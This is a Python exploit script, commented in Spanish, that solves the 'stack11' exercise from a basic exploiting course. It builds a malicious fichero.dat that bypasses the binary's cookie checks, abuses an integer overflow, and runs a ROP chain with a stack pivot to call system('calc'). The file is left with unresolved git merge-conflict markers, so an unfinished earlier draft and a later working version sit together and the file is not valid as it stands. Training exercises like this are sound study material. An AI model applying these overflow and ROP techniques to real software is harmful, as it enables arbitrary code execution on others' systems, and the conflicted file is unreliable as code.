<<<<<<< HEAD
#Solucion reto stack11 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/014%20stack11.idb/
import os
import struct

xorWord = lambda ss,cc: ''.join(chr(ord(s)^ord(c)) for s,c in zip(ss,cc*100))
#Prologo sub esp, 58 reserva 0x58 bytes en el stack
#var_44 toma el valor 0x32 integer => 50 dec
#var_50 => 0
#var_48 => 0
#DstBuf => 0
#Se lee fichero.dat con fopen
#El primer if valida que exista el archivo
f = open("fichero.dat", "w")

#Segundo bloque
#Se lee el primer byte del fichero con fread y se colocan en var_50
var_50 = "\xFF" #Integer overflow 100 bytes to bypass != 100
#Se leen los siguientes 4 bytes y se colocan en var_4C
var_4C = struct.pack("<I", 0x45464748)
#Se leen los siguientes 4 bytes y se colocan en var_48
var_48 = struct.pack("<I", 0x25262728) #No estoy seguro si debe ir por el good way o por el bad way
securityCookie = struct.pack("<I", 0xB8C41CF9)
xorCalc = xorWord("calc", securityCookie)
xorExe = xorWord(".exe", securityCookie)
calc = xorCalc+xorExe+"  "
calc = "calc.exe  "+'A'*50

#Comenzamos a ropear #el puntero a system esta en 0x10103028 y apunta a 6FAB1070
#En 0x10103020 esta el puntero a mi string calc.exe
#llamar a pop reg oara colocar 0x10103020 a un registro
#10101A06 pop edi # pop esi # pop ebx # retn stack11.exe 4 12 one-reg, stack edi, ebx, esi  nonull, ascii
#La mecha esta al igual que el reto anterior usar pop rets para llegar a
#0012FEFC  6E591070  ucrtbase:ucrtbase_system
#0012FF00  001F8370  debug018:001F8370
#en el stack, que esta 
#101010D5 add esp, 18h # pop ebp # retn stack11.exe 3 28 imm-to-reg, one-reg, stack, math ebp, esp esp nonull
#10101450 pop ecx # retn stack11.exe 2 4 one-reg, stack ecx  nonull, ascii
#rop1 = struct.pack("<I", 0x10101450) #pop ecx ret hasta colocarme antes de calc
#rop2 = struct.pack("<I", 0x00000054) #val to ecx
#1010164C mov eax, ecx # retn stack11.exe 2 0 reg-to-reg eax ecx nonull, ascii
#rop3 = struct.pack("<I", 0x1010164C) #mov eax, ecx
#rop4 = struct.pack("<I", 0x10101A1C) #sub eax, ecx
rop1 = struct.pack("<I", 0x10101A1C)
ropChain = rop1
#ret  = struct.pack("<I", 0x10101303)
#Colocar en el stack el puntero 0x10103020
#rop1 = struct.pack("<I", 0x10103020)
#rop2 = 
#Colocar 0x10103020 o a [0x10103020] a un registro
#Pushear [0x10103020] al stackrop4 = struct.pack("<I", 0x10101092)
#Colocar 0x10103028 a un registro
#Llamar a call [0x10103028] o en su defecto mover [0x10103028] a un registro y llamar al registro
#101011F9 add esp, 4 # xor eax, eax # mov esp, ebp # pop ebp # retn stack11.exe 5 8 imm-to-reg, reg-to-reg, stack, bit, one-reg, math eax, ebp, esp eax, ebp, esp nonull
junk2 = struct.pack("<I", 0x0012FF70)+struct.pack("<I", 0x00000000)+struct.pack("<I", 0x10101092)+struct.pack("<I", 0x00000000)+struct.pack("<I", 0x00000048)+'B'*15
verificationNumber = "\x64"
#compara que el DstBuffer tenga como maximo de largo 0x32 bytes (Integer overflow? No parese)

#Se coloca en ecx un puntero a un puntero hacia system
#0x101020B0 / 0x10103028!!! dword
 
#Se comprar var_48 con 0x25262728 equivalente al string "%&'("
#Si no es iguall llega a la funcion sub_10101210 ??? breakpoint!!!!
#Si es igual salta al bloque loc_191911D9 donde se encuentra un malloc
#se coloca en la pila size, valor entero de 0x32: push 32h

#Luego se llama a la funcion sub_10101030
#Se compara arg_0 con 0x45464748 que equivale al string "EFGH"
#Si se cumple la condicion comienza a leer el fichero.dat nuevamente ???? lee el ultimo byte?
#Y se compara con el valor de 0x64


#Tracto final, genero el fichero
payload = var_50 + var_4C + var_48 + calc + ropChain + junk2 + verificationNumber

f.write(payload)
f.close()
=======
#Solucion al reto stack11 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/014%20stack11.idb/
#Tip: Sub te sube el puntero en el stack, add te baja el puntero en el stack, 
#sub esp, 4 equivale a subir un address el puntero en el stack
#add esp, 4 equivale a bajar un address el puntero en el stack
import os
import struct

#El primer if valida que exista el archivo
f = open("fichero.dat", "w")

#Se lee el primer byte del fichero con fread y se colocan en var_50
var_50 = "\xFF" #Integer overflow 100 bytes to bypass != 100
#Se leen los siguientes 4 bytes y se colocan en var_4C
var_4C = struct.pack("<I", 0x45464748) # Cookie1
#Se leen los siguientes 4 bytes y se colocan en var_48
var_48 = struct.pack("<I", 0x25262728) # Cookie2

#En este buffer pondremos nuestro rop chain porq mas abajo falta espacio y necesitaremos hacer stack sub
rop1 = struct.pack("<I", 0x101014FE) #pop esi => Dejo el puntero a system almacenado en esi
rop2 = struct.pack("<I", 0x101020B0) #Puntero a System
rop3 = struct.pack("<I", 0x10101450) #Pop ecx 
rop4 = "calc" #string de calc a poner en 0x10103210
rop5 = struct.pack("<I", 0x1010164C) #mov eax, ecx
rop6 = struct.pack("<I", 0x10101303) #pop ecx para poner una nueva direccion en ecx
rop7 = struct.pack("<I", 0x10103210) #zona de idata donde podamos escribir
rop8 = struct.pack("<I", 0x1010167A) #xchg eax. [ecx], pop, ret => A Resaltar, xchag copia eax hacia donde apunta ecx, se leede izq a derecha
rop9 = struct.pack("<I", 0x10103220) #basura escribible para evitar errores en los movs posteriores al sub esp, eax
rop10 = struct.pack("<I", 0x101013B8) # mov esi, [esi], mov ecx, esi, call j____guard_check_icall_fptr, call esi llamada indirecta a esi
rop11 = struct.pack("<I", 0x10103210) # Direccion donde metimos "calc" con el xchg

#Construimos nuestro ropChain
ropChain = rop1 + rop2 + rop3 + rop4 + rop5 + rop6 + rop7 + rop8 + rop9 + rop10 + rop11 + 'A' * 16 #Agregamos basura por validacion de 0x64 de largo

#Realizamos un RopSub ya que no tenemos suficiente espacio y nos ponemos sobre la RopChain
#Lo ordeno de en el orden de uso
ropSub3 = struct.pack("<I", 0x10101A1C) #Salto y uso sub esp, eax (mov eax, [esp+8+arg_4]) controlamos esp+8 en el ropPiv1
junk1 = 'B'*8
ropSub2 = struct.pack("<I", 0x10101092) #Salto los push que se meten entre mi RopChain y mi puntero al stack con # add esp, 4 ; pop edi ; pop esi ; pop ebp ; retn
junk2 = 'B'*4
ropSub1 = struct.pack("<I", 0x00000040) #controlo esp+8 para usar el sub esp, eax y ponerme sobre mi RopChain
junk3 = 'B'*16

#Construimos nuestro ropSub 
ropSub = ropSub3 + junk1 + ropSub2 + junk2 + ropSub1 + junk3
#Construimos nuestro Payload
payload = var_50 + var_4C + var_48 + ropChain + ropSub

#Escribimos el Fichero
f.write(payload)
f.close()

#Ejecutamos stack11.exe
os.system("stack11.exe")
>>>>>>> 5367b3033f6d315d562c0958a68552bdcf27471f
